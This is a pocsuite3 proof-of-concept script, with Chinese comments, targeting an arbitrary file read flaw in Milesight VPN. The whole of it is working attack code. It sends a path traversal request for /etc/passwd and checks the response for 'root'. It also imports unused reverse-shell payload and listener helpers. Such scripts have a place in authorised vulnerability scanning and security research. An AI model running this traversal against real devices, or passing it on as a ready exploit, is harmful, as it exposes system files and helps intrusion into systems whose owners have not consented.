# _*_ coding:utf-8 _*_
# @Time : 2023/12/17
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class milesight_vpn_fileread(POCBase):
    pocDesc = '''milesight vpn 任意文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-17'
    name = 'milesight vpn 任意文件读取漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/../../../../../../../../../../../etc/passwd'
        #check_path = self.url+ "/test.aspx"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            'Connection': 'close',
            'Accept-Encoding': 'gzip'
        }

        try:


            response = requests.get(url, headers=headers)
            if response.status_code == 200 and 'root' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(milesight_vpn_fileread)